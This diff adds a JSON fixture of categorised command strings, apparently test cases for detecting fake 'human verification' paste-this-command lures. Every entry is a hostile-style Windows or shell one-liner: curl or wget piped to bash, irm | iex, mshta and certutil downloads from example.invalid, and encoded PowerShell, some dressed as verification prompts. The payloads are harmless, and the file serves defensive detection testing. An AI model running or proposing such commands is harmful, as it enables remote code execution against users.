@@ -1,0 +1,226 @@
+[
+  {
+    "category": "base64-long",
+    "text": "cmd /c echo QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ && calc"
+  },
+  {
+    "category": "base64-long",
+    "text": "Verification check BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB cmd /c echo ok && calc"
+  },
+  {
+    "category": "base64-long",
+    "text": "certutil -decode CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC sample.txt && echo complete"
+  },
+  {
+    "category": "base64-long",
+    "text": "powershell -enc ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ; echo finished"
+  },
+  {
+    "category": "bitsadmin",
+    "text": "bitsadmin\n/transfer\njob https://example.invalid/a C:\\Temp\\a\n&& echo done"
+  },
+  {
+    "category": "bitsadmin",
+    "text": "Human verification: bitsadmin /transfer id https://example.invalid/x C:\\Temp\\x && echo ready"
+  },
+  {
+    "category": "bitsadmin",
+    "text": "bitsadmin /create verify && bitsadmin /addfile verify https://example.invalid/demo C:\\Temp\\demo && echo ok"
+  },
+  {
+    "category": "bitsadmin",
+    "text": "bitsadmin /transfer job https://example.invalid/a C:\\Temp\\a && echo done"
+  },
+  {
+    "category": "certutil",
+    "text": "certutil\t-urlcache\t-f\thttps://example.invalid/data C:\\Temp\\data & echo ok"
+  },
+  {
+    "category": "certutil",
+    "text": "certutil.exe -decode sample.txt output.txt && calc"
+  },
+  {
+    "category": "certutil",
+    "text": "certutil -verify -urlfetch https://example.invalid/cert && echo complete"
+  },
+  {
+    "category": "certutil",
+    "text": "certutil\n-decode\nsample.txt output.txt\n&& echo finished"
+  },
+  {
+    "category": "cmd-chain",
+    "text": "Please wait for verification: cmd /c echo ok && echo finished"
+  },
+  {
+    "category": "cmd-chain",
+    "text": "cmd.exe /c echo step one & echo step two"
+  },
+  {
+    "category": "cmd-chain",
+    "text": "cmd.exe /c whoami && echo done"
+  },
+  {
+    "category": "cmd-chain",
+    "text": "cmd /c \"echo status\" && echo complete"
+  },
+  {
+    "category": "cmd-chain",
+    "text": "cmd /c echo checking && calc"
+  },
+  {
+    "category": "cmd-chain",
+    "text": "cmd\t/c\techo ready&&calc"
+  },
+  {
+    "category": "cmd-chain",
+    "text": "cmd /c echo verification && echo complete"
+  },
+  {
+    "category": "curl-pipe",
+    "text": "Verification check passed. curl -s https://example.invalid/task | bash; calc"
+  },
+  {
+    "category": "curl-pipe",
+    "text": "curl\nhttps://example.invalid/demo\n| bash\n&& echo done"
+  },
+  {
+    "category": "curl-pipe",
+    "text": "wget https://example.invalid/a -O- | sh && echo checked"
+  },
+  {
+    "category": "curl-pipe",
+    "text": "curl https://example.invalid/check | sh && calc"
+  },
+  {
+    "category": "curl-pipe",
+    "text": "curl -fsSL https://example.invalid/x | /bin/sh; echo ready"
+  },
+  {
+    "category": "curl-pipe",
+    "text": "curl -fsSL https://example.invalid/demo.sh | bash; echo done"
+  },
+  {
+    "category": "mshta",
+    "text": "mshta\nhttps://example.invalid/demo.hta\n& echo done"
+  },
+  {
+    "category": "mshta",
+    "text": "Please verify your session: mshta https://example.invalid/verify.hta & calc"
+  },
+  {
+    "category": "mshta",
+    "text": "MSHTA.EXE https://example.invalid/check.hta && calc"
+  },
+  {
+    "category": "mshta",
+    "text": "mshta  https://example.invalid/a.hta\t&\techo complete"
+  },
+  {
+    "category": "multiline-and-spaces",
+    "text": "   Please complete human verification before continuing.\ncmd /c echo checked && calc"
+  },
+  {
+    "category": "multiline-and-spaces",
+    "text": "powershell -Command \"echo one\"\n# verification text\ncalc"
+  },
+  {
+    "category": "multiline-and-spaces",
+    "text": "bitsadmin /transfer\njob https://example.invalid/demo C:\\Temp\\demo\n&& echo finished"
+  },
+  {
+    "category": "multiline-and-spaces",
+    "text": "cmd /c echo verification\n&& calc"
+  },
+  {
+    "category": "multiline-and-spaces",
+    "text": "mshta   https://example.invalid/step.hta   &   echo ok"
+  },
+  {
+    "category": "multiline-and-spaces",
+    "text": "certutil -urlcache\n-f https://example.invalid/file C:\\Temp\\file\n& calc"
+  },
+  {
+    "category": "powershell-download-or-iex",
+    "text": "powershell -Command \"(New-Object Net.WebClient).DownloadString('https://example.invalid/demo') | iex; echo done\""
+  },
+  {
+    "category": "powershell-download-or-iex",
+    "text": "powershell -w hidden -Command \"echo complete\""
+  },
+  {
+    "category": "powershell-download-or-iex",
+    "text": "pwsh -Command \"iwr https://example.invalid/info; calc\""
+  },
+  {
+    "category": "powershell-download-or-iex",
+    "text": "powershell -Command \"Invoke-RestMethod https://example.invalid/info; echo ok\""
+  },
+  {
+    "category": "powershell-download-or-iex",
+    "text": "powershell -Command \"irm https://example.invalid/demo | iex; calc\""
+  },
+  {
+    "category": "powershell-download-or-iex",
+    "text": "Human verification code: pwsh -Command \"iex 'echo checked'\""
+  },
+  {
+    "category": "powershell-download-or-iex",
+    "text": "pwsh -NoProfile -Command \"Invoke-Expression 'calc'\""
+  },
+  {
+    "category": "powershell-encoded",
+    "text": "powershell -NoProfile -enc ZQBjAGgAbwAgAG8AawA="
+  },
+  {
+    "category": "powershell-encoded",
+    "text": "powershell -w hidden -enc ZWNobyBjYWxj"
+  },
+  {
+    "category": "powershell-encoded",
+    "text": "powershell -enc ZWNobyBjYWxj"
+  },
+  {
+    "category": "powershell-encoded",
+    "text": "pwsh.exe -windowstyle hidden -encodedcommand ZQBjAGgAbwAgAGMAYQBsAGMA"
+  },
+  {
+    "category": "powershell-encoded",
+    "text": "powershell\t-enc\tZQBjAGgAbwAgAG8AawA="
+  },
+  {
+    "category": "powershell-encoded",
+    "text": "Verification check: powershell -enc ZQBjAGgAbwAgAG8AawA="
+  },
+  {
+    "category": "powershell-encoded",
+    "text": "pwsh -e ZQBjAGgAbwAgAG8AawA="
+  },
+  {
+    "category": "powershell-encoded",
+    "text": "powershell -enc ZQBjAGgAbwAgAGMAYQBsAGMA"
+  },
+  {
+    "category": "utility-mix",
+    "text": "rundll32.exe shell32.dll,Control_RunDLL && echo done"
+  },
+  {
+    "category": "utility-mix",
+    "text": "wget https://example.invalid/info | powershell; echo finished"
+  },
+  {
+    "category": "utility-mix",
+    "text": "pwsh -NoProfile -Command \"echo ready\"; certutil -decode input.txt output.txt && calc"
+  },
+  {
+    "category": "utility-mix",
+    "text": "cmd.exe /c echo status && powershell -Command \"echo done\""
+  },
+  {
+    "category": "utility-mix",
+    "text": "Verification check: mshta https://example.invalid/demo & echo complete"
+  },
+  {
+    "category": "utility-mix",
+    "text": "bash -c \"echo verify && calc\""
+  }
+]
